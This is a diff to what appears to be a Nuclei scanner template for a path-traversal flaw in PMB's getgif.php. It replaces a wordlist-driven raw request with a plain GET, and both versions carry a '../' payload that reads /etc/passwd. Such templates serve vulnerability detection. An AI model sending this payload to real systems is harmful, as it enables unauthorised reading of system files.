@@ -7,18 +7,10 @@ info:
   reference: https://www.exploit-db.com/exploits/49054
 
 requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+  - method: GET
+    path:
+      - '{{BaseURL}}/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=nuclei'
 
-    raw:
-      - |
-        GET /pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif=nuclei HTTP/1.1
-        Host: {{Subdomains}}
-        Accept-Encoding: gzip, deflate
-        Connection: close
-        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko)
     matchers-condition: and
     matchers:
       - type: status
